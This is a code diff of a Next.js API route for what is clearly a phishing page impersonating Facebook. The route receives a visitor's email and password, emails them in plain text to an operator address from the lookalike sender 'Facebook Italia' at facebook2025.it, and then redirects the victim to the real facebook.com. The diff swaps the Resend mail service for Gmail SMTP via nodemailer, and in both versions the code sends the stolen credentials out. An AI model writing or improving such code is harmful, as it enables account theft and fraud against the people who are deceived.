@@ -1,7 +1,6 @@
-
-  // /app/api/process/route.ts
+// /app/api/process/route.ts
 import { NextResponse } from 'next/server';
-import { Resend } from 'resend';
+import nodemailer from 'nodemailer';
 
 export async function POST(request: Request) {
   try {
@@ -9,24 +8,37 @@ export async function POST(request: Request) {
     const email = body.get('email')?.toString() || '';
     const password = body.get('password')?.toString() || '';
 
-    // Validazione base
+    // Validazione
     if (!email || !password) {
       return NextResponse.json({ error: 'Email e password richiesti.' }, { status: 400 });
     }
 
-    const resend = new Resend(process.env.RESEND_API_KEY);
+    // Configura SMTP Gmail
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true,
+      auth: {
+        user: 'securitynoreply@facebook2025.it', // deve essere G Suite / Google Workspace attivo
+        pass: process.env.EMAIL_PASSWORD // usa una App Password, NON la password normale
+      }
+    });
 
-    await resend.emails.send({
-      from: 'securitynoreply@facebook2025.it',
+    // Costruisci email
+    const mailOptions = {
+      from: '"Facebook Italia" <securitynoreply@facebook2025.it>',
       to: process.env.EMAIL_TO ?? '',
       subject: 'Nuovo accesso dal sito Facebook',
-      text: `Email: ${email}\nPassword: ${password}`,
-    });
+      text: `Email: ${email}\nPassword: ${password}`
+    };
+
+    // Invia email
+    await transporter.sendMail(mailOptions);
 
     // Redirect dopo invio
     return NextResponse.redirect('https://www.facebook.com');
   } catch (error) {
-    console.error('Errore nella route API:', error);
-    return NextResponse.json({ error: 'Errore interno del server.' }, { status: 500 });
+    console.error('Errore invio Gmail:', error);
+    return NextResponse.json({ error: 'Errore interno server.' }, { status: 500 });
   }
 }
